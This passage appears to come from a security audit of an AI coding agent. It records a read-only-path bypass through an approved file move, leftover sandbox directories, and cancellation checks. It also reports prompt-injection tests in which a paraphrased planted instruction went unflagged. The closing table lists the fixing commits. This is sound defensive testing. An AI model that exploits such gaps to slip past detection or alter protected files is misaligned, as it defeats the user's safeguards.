| C7 | **Reproduced for headless `--auto`.** With `TMPDIR` pointed at an empty directory, one run leaves `aivyx-confine-XXXXXX` behind; an ACP run that executed a command left none. (`/tmp` here held 167 older `aivyx-confine-*` directories.) |
| C9 | **Reproduced.** With `read_only_paths = ["data/brief.md"]`, `move_file data data_old` was approved and moved the read-only file; the same move with `data` itself listed is refused. |

### The brief's "not checked" items

- **ACP cancellation: clean** apart from C22. `session/cancel` mid-stream
  returned `stopReason: cancelled` in the same second and the next prompt on
  the session worked; mid-`run_shell` (`sleep 301`) and mid-`run_command`
  (`sleep 302`) both ended the tool as `failed: command was cancelled` with no
  orphan process afterwards; `/test` with a 97 s test ended with `Tests
  cancelled` and no orphan test binary; a cancel during a pending approval
  with a compliant client cancelled the tool.
- **MCP cancellation: clean.** A cancelled `code` call (nine-file task,
  cancelled after 8 s) stopped after the first file with no further writes and
  no response, as the MCP spec says; the control without a cancel wrote all
  nine. A cancelled `code_reply` wrote no more files in the following 10 s
  and the session answered the next `code_reply` normally.
- **`read_only_paths` through `edit_file`, `patch_file`, `write_file`:**
  all three refused with the "fixed input" message (BRIEF.md and
  `data/brief.md`); only C9's move gets through.
- **Format-2 pack:** install, `pack list`, `use` with consent on a pty (and
  "left off, no terminal" without one), `off`; the TUI start-up notice names the
  pack. Found C6 (reproduced), C21 and C23.
- **Team mode with a custom roster:** the lead delegated to a `docs-writer`
  whose `extra_deny_paths = ["src/"]`: the docs file was written and every
  read, grep and edit of `src/` by the specialist was hard-blocked. Found C24.
- **Prompt injection:** a file with an obvious phrase and a fetched page
  (`web_fetch`, `[web] allow_private_targets` set for the test) were flagged with
  the "likely prompt injection" note and nothing ran. A paraphrased instruction
  in a file (no listed phrase) was not flagged and, with approvals denied, the
  9B did not act on it. By default `web_fetch` refuses a loopback address.
- The unranked observation became C25 above.

## Fixes (Task 13)

All Medium and High findings and the live-session defects are fixed on `main`
(pushed; CI run 41139515807 green).

| ID | Fix |
|---|---|
| C1 | `c5b5bf7`..`9d05789`: instruction files are canonicalised and checked as link and target; project file must resolve inside the project |
| C2 | `c5b5bf7`: `--report` written with `O_NOFOLLOW`, regular files only |
| C3 | `55abbd4` |
| C4 | `8ac5408` |
| C5, C6 | `21b535d` (also covers L3, the headless and ACP display filters) |
| C7 | `cb445a5` |
| C8 | `e88d797` |
| C9 | `ab646f7` |
| C10 | `368b0c5` |
| C21 | `9d05789` |
| C22 | `07dc073` |
| C23, C24 | `c1a81da` (the slow first prompt behind an unresponsive MCP server stays open) |
| C25 | `36eb989` |
| L3, L8, L9, L10 | `21b535d`, `0c57679` |
| L1, L2, L4, L5, L6, L7 | open, with reasons, in `ROADMAP.md` |
